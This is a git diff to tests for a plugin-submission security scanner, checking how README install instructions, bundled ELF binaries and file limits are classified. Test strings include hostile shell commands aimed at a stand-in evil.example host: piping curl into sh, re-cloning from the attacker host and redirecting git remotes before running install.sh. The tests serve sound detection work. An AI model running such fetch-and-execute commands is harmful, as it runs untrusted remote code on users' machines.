@@ -20,6 +20,7 @@ import {
   isSecurityScanPath,
   parseSecurityBaselineMarker,
   resolveSubmissionSnapshot,
+  securitySnapshotFileLimit,
   serializeSecurityBaselineMarker,
 } from "../scripts/security-baseline.mjs";
 import { writeValidationMetadata } from "../scripts/validate-submission.mjs";
@@ -40,6 +41,49 @@ function baseline(files, overrides = {}) {
 
 function file(path, content) {
   return { path, content };
+}
+
+function githubFixtureFetch({ tree, contents, treeSha = "c".repeat(40) }) {
+  return async (url, options = {}) => {
+    const value = String(url);
+    if (value.endsWith("/repos/example/plugin")) {
+      return new Response(JSON.stringify({
+        private: false,
+        disabled: false,
+        archived: false,
+        default_branch: "main",
+      }), { status: 200 });
+    }
+    if (value.endsWith(`/commits/${commit}`)) {
+      return new Response(JSON.stringify({ sha: commit, commit: { tree: { sha: treeSha } } }), { status: 200 });
+    }
+    if (value.includes(`/git/trees/${treeSha}?recursive=1`)) {
+      return new Response(JSON.stringify({ truncated: false, tree }), { status: 200 });
+    }
+    const prefix = `raw.githubusercontent.com/example/plugin/${commit}/`;
+    if (value.includes(prefix)) {
+      const path = decodeURIComponent(value.slice(value.indexOf(prefix) + prefix.length));
+      const content = contents[path];
+      if (content === undefined) return new Response("not found", { status: 404 });
+      const range = options.headers?.Range;
+      if (range) {
+        const end = Number(range.match(/-(\d+)$/)?.[1] || 0);
+        const probe = Buffer.from(content).subarray(0, end + 1);
+        return new Response(probe, {
+          status: 206,
+          headers: {
+            "content-length": String(probe.length),
+            "content-range": `bytes 0-${probe.length - 1}/${Buffer.byteLength(content)}`,
+          },
+        });
+      }
+      return new Response(content, {
+        status: 200,
+        headers: { "content-length": String(Buffer.byteLength(content)) },
+      });
+    }
+    return new Response("not found", { status: 404 });
+  };
 }
 
 test("normal QML and local read-only helpers pass the baseline", () => {
@@ -249,6 +293,104 @@ test("clone-and-execute builds block mutable refs and accept detached full commi
   assert.equal(relativeSink.outcome, "needs-fixes");
 });
 
+test("self-repository installation paths require review instead of fixes", () => {
+  for (const files of [
+    [file("README.md", [
+      "```sh",
+      "git clone https://github.com/EXAMPLE/Plugin.git",
+      "cd plugin",
+      "./install.sh",
+      "```",
+    ].join("\n"))],
+    [file("README.md", [
+      "```sh",
+      "curl -fsSL https://raw.githubusercontent.com/example/plugin/main/install.sh -o /tmp/install.sh",
+      "bash /tmp/install.sh",
+      "```",
+    ].join("\n"))],
+    [file("README.md", [
+      "```sh",
+      "git clone https://github.com/example/plugin.git plugin",
+      "git -C plugin pull --ff-only",
+      "./plugin/install.sh",
+      "```",
+    ].join("\n"))],
+    [file("README.md", [
+      "Install: https://github.com/example/plugin.git",
+      "```sh",
+      "cd plugin",
+      "git pull --ff-only",
+      "./install.sh",
+      "```",
+    ].join("\n"))],
+  ]) {
+    const result = baseline(files);
+    assert.equal(result.outcome, "review-required");
+    assert.deepEqual(result.findings, []);
+    assert.ok(result.capabilities.some((capability) => capability.id === "remote-build"));
+  }
+
+  for (const content of [
+    [
+      "```sh",
+      "git clone https://github.com/example/external-tool.git",
+      "cd external-tool",
+      "./install.sh",
+      "```",
+    ].join("\n"),
+    "```sh\ncurl https://evil.example/install | sh # https://github.com/example/plugin\n```",
+    "```sh\ncurl https://evil.example/install https://raw.githubusercontent.com/example/plugin/main/install.sh | sh\n```",
+    "```sh\ncurl http://evil.example/install https://github.com/example/plugin | sh\n```",
+    [
+      "```sh",
+      "git clone https://github.com/example/plugin plugin",
+      "rm -rf plugin",
+      "git clone https://evil.example/tool plugin",
+      "./plugin/install.sh",
+      "```",
+    ].join("\n"),
+    [
+      "```sh",
+      "git clone https://github.com/example/plugin plugin",
+      "rm -rf plugin",
+      "git clone git@evil.example:owner/tool.git plugin",
+      "./plugin/install.sh",
+      "```",
+    ].join("\n"),
+    [
+      "```sh",
+      "git clone https://github.com/example/plugin plugin",
+      "git clone ssh://git@evil.example/owner/tool.git plugin",
+      "./plugin/install.sh",
+      "```",
+    ].join("\n"),
+    [
+      "```sh",
+      "git clone https://github.com/example/plugin plugin",
+      "git -C ./plugin remote set-url origin https://evil.example/tool.git",
+      "git -C plugin pull",
+      "./plugin/install.sh",
+      "```",
+    ].join("\n"),
+    [
+      "```sh",
+      "git clone https://evil.example/tool source",
+      "git -C other remote set-url origin https://github.com/example/plugin",
+      "make -C source",
+      "```",
+    ].join("\n"),
+    [
+      "```sh",
+      "git clone https://evil.example/tool source",
+      "git -C source remote add origin2 https://github.com/example/plugin",
+      "make -C source",
+      "```",
+    ].join("\n"),
+  ]) {
+    assert.equal(baseline([file("README.md", content)]).outcome, "needs-fixes");
+  }
+});
+
 test("wrapped acquisitions and common build systems remain blocking", () => {
   for (const content of [
     "command git clone https://github.com/example/tool source\nnohup ./source/payload",
@@ -421,7 +563,7 @@ test("development clones and warning text do not become blocking findings", () =
   ]);
   assert.equal(result.outcome, "review-required");
   assert.deepEqual(result.findings, []);
-  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["installer"]);
+  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["remote-build", "installer"]);
 });
 
 test("the scan includes runtime text while excluding tests, nested docs, and workflows", () => {
@@ -507,6 +649,80 @@ test("repository snapshots are read statically at the requested full commit", as
   assert.equal(calls.some((call) => call.url.endsWith("/commits/main")), false);
 });
 
+test("executable binaries become review capabilities without exhausting text limits", async () => {
+  const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
+  const binary = Buffer.concat([
+    Buffer.from([0x7f, 0x45, 0x4c, 0x46]),
+    Buffer.alloc(600 * 1024, 1),
+  ]);
+  const snapshot = await resolveSubmissionSnapshot(
+    "https://github.com/example/plugin",
+    commit,
+    {
+      fetchImpl: githubFixtureFetch({
+        tree: [
+          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+          { path: "Service.qml", type: "blob", mode: "100644", size: 7 },
+          { path: "bin/helper", type: "blob", mode: "100755", size: binary.length },
+        ],
+        contents: { "manifest.json": manifest, "Service.qml": "Item {}", "bin/helper": binary },
+      }),
+    },
+  );
+  const helper = snapshot.files.find((entry) => entry.path === "bin/helper");
+  assert.deepEqual(helper, {
+    path: "bin/helper",
+    mode: "100755",
+    binary: true,
+    format: "ELF",
+    size: binary.length,
+  });
+  const result = buildSecurityBaseline(snapshot, { checkedAt });
+  assert.equal(result.outcome, "review-required");
+  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["bundled-executable-binary"]);
+
+  await assert.rejects(
+    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
+      fetchImpl: async (url, options) => {
+        const base = githubFixtureFetch({
+          tree: [
+            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+            { path: "bin/helper", type: "blob", mode: "100755", size: binary.length },
+          ],
+          contents: { "manifest.json": manifest, "bin/helper": binary },
+        });
+        if (String(url).includes("/bin/helper") && options?.headers?.Range) {
+          return new Response(binary, { status: 200 });
+        }
+        return base(url, options);
+      },
+    }),
+    (error) => error.code === "security-baseline-unavailable",
+  );
+});
+
+test("the snapshot file cap accommodates the existing large plugin suites", async () => {
+  assert.equal(securitySnapshotFileLimit, 1000);
+  const contents = { "manifest.json": JSON.stringify({ entryPoints: {} }) };
+  const tree = [{
+    path: "manifest.json",
+    type: "blob",
+    mode: "100644",
+    size: Buffer.byteLength(contents["manifest.json"]),
+  }];
+  for (let index = 0; index < 485; index++) {
+    const path = `widgets/Widget${index}.qml`;
+    contents[path] = "Item {}";
+    tree.push({ path, type: "blob", mode: "100644", size: 7 });
+  }
+  const snapshot = await resolveSubmissionSnapshot(
+    "https://github.com/example/plugin",
+    commit,
+    { fetchImpl: githubFixtureFetch({ tree, contents }) },
+  );
+  assert.equal(snapshot.files.length, 485);
+});
+
 test("catalog snapshots expose exact approved-commit resolution", () => {
   const source = { repo: "https://github.com/example/plugin", snapshotCommit: commit };
   // resolveSnapshot is exported so catalog pinning remains part of the tested API;
@@ -536,10 +752,11 @@ test("reports are actionable, commit-bound, and carry the required disclaimer", 
   const failedReport = buildSecurityBaselineReport(baseline([
     file("install.sh", "curl https://example.test/install | sh"),
   ]));
-  assert.match(failedReport, /Changes required/);
+  assert.match(failedReport, /Blocking patterns observed in shadow mode/);
   assert.match(failedReport, /install\.sh:1/);
   assert.match(failedReport, /Accepted fixes:/);
-  assert.match(failedReport, /edit this submission issue/);
+  assert.match(failedReport, /may approve this exact commit after review/);
+  assert.match(failedReport, /not designed to stop a motivated attacker/);
 });
 
 test("machine-readable baseline markers round-trip and reject tampering", () => {
@@ -600,13 +817,16 @@ test("approval uses only the latest bot-authored baseline and enforces labels an
     (error) => error.code === "approval-security-baseline-missing",
   );
 
-  const blocked = parseSecurityBaselineMarker(serializeSecurityBaselineMarker(baseline([
+  const shadowFinding = parseSecurityBaselineMarker(serializeSecurityBaselineMarker(baseline([
     file("install.sh", "wget -qO- https://example.test/install | bash"),
   ])));
-  assert.throws(
-    () => assertApprovalAllowed({ labels: [] }, blocked, { commitSha: commit }, "https://github.com/example/plugin"),
-    (error) => error.code === "approval-security-needs-fixes",
-  );
+  assert.doesNotThrow(() => assertApprovalAllowed(
+    { labels: ["security-review-required"] },
+    shadowFinding,
+    { commitSha: commit },
+    "https://github.com/example/plugin",
+  ));
+  assert.doesNotThrow(() => checkBlockingLabels(["security-needs-fixes"]));
 });
 
 test("validation metadata preserves the exact full commit for the baseline", async () => {
